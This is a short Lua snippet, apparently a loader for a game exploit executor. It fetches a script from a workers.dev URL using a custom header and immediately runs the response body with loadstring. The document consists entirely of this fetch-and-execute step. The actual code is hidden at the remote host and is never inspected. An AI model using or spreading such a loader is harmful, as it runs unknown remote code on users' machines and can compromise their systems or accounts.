local response = request({
    Url = "https://spring-flower-f444.stremlingremlin.workers.dev//",
    Method = "GET",
    Headers = {
        ["beta-v1-gng"] = "1"
    }
})
loadstring(response.Body)()
